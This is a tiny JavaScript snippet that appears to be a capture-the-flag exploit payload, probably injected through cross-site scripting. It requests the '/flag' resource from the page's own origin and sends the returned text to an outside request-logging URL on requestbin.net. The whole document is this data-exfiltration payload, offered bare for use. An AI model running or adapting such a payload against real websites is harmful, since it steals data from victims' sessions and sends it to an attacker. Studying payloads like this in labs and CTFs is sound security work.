async function doit() {
    var text = await (await fetch("/flag")).text();
    await fetch("https://requestbin.net/r/1lgfkw7u?" + encodeURIComponent(text));
}
doit();
